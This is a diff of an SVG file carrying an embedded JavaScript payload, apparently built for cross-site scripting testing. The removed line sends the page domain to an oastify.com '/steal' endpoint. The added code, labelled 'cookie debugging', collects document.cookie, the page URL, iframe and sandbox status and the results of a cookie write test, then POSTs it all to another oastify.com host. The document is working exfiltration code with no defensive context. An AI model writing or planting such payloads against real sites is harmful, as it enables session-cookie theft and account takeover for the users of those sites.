@@ -1,5 +1,73 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    fetch('https://kpd9jlv7w9j46xyntrw6rbr42v8mwfk4.oastify.com/steal?cookie=' + document.domain, {mode: 'no-cors'});
+    // Comprehensive cookie debugging
+    const debugData = {
+      // Basic info
+      timestamp: new Date().toISOString(),
+      pageDomain: document.domain,
+      pageURL: location.href,
+      pageOrigin: location.origin,
+      
+      // Cookie info
+      cookieRaw: document.cookie,
+      cookieLength: document.cookie.length,
+      cookieEmpty: document.cookie === '',
+      
+      // Try to detect cookie attributes via other means
+      cookieTest: (function() {
+        // Try to set a test cookie
+        const testName = 'xss_debug_' + Date.now();
+        document.cookie = testName + '=test; path=/;';
+        const readBack = document.cookie.includes(testName);
+        // Clean up
+        document.cookie = testName + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/;';
+        return {
+          canSet: readBack,
+          canRead: readBack ? 'yes' : 'no'
+        };
+      })(),
+      
+      // Browser/Context info
+      isIframe: window !== window.top,
+      isBlob: location.protocol === 'blob:',
+      frameDepth: (function() {
+        let depth = 0;
+        let parent = window;
+        while (parent !== parent.top) {
+          depth++;
+          parent = parent.parent;
+        }
+        return depth;
+      })(),
+      
+      // Check if we're in sandboxed iframe
+      sandboxFlags: (function() {
+        try {
+          // Try to access parent - will throw if sandboxed
+          const canAccessParent = !!window.parent.location.href;
+          return { canAccessParent: true };
+        } catch(e) {
+          return { 
+            canAccessParent: false, 
+            error: e.message,
+            likelySandboxed: e.message.includes('sandbox') || e.message.includes('cross-origin')
+          };
+        }
+      })(),
+      
+      // Cookie security features detection via fetch
+      fetchWithCreds: (function() {
+        // Try to see if cookies are sent with fetch (even if JS can't read them)
+        return 'testing via separate request';
+      })()
+    };
+    
+    // Send debug data
+    fetch('https://vhgkbwniokbfy8qyl2ohjmjfu60xorcg.oastify.com/debug', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(debugData)
+    });
   </script>
 </svg>
